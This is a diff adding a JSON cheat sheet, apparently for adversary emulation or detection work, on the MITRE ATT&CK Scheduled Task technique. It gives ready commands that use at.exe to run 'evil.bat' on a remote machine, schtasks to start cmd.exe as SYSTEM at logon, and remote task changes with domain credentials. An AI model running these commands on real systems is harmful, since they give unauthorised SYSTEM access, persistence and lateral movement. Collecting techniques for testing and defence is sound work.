@@ -1,0 +1,24 @@
+{
+  "Scheduled Task": {
+    "MITRE ATT&CK Technique:": "[T1053](https://attack.mitre.org/wiki/Technique/T1053)",
+      "Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time": "[Examples Of Creating Tasks](https://technet.microsoft.com/en-us/library/cc725744(v=ws.11).aspx#BKMK_create)",
+    "at.exe": {
+      "Note: deprecated in Windows 8+": "",
+      "Privileged Escalation": {
+        "This command can be used locally to escalate privilege to SYSTEM or be used across a network to execute commands on another system.": {
+          "Example:": "net use \\\\[computername|IP] /user:DOMAIN\\username password\nnet time \\\\[computername|IP]\nat \\\\[computername|IP] 13:20 c:\\temp\\evil.bat\n"
+        }
+      }
+    },
+    "schtask.exe": {
+      "Launch Interactive cmd.exe": {
+        "Input:": "schtasks /create /tn \"mysc\" /tr C:\\windows\\system32\\cmd.exe /sc ONLOGON /ru \"System\"\n"
+      }
+    },
+    "Remote Scheduled Task": {
+      "Create, modify, remove scheduled task (replace IP with target)": {
+        "Input:": "SCHTASKS /Change /S 127.0.0.1 /RU <DOMAIN>\\<USER> /RP <Password> /TN \"evil task\" /ST 17:01"
+      }
+    }
+  }
+}
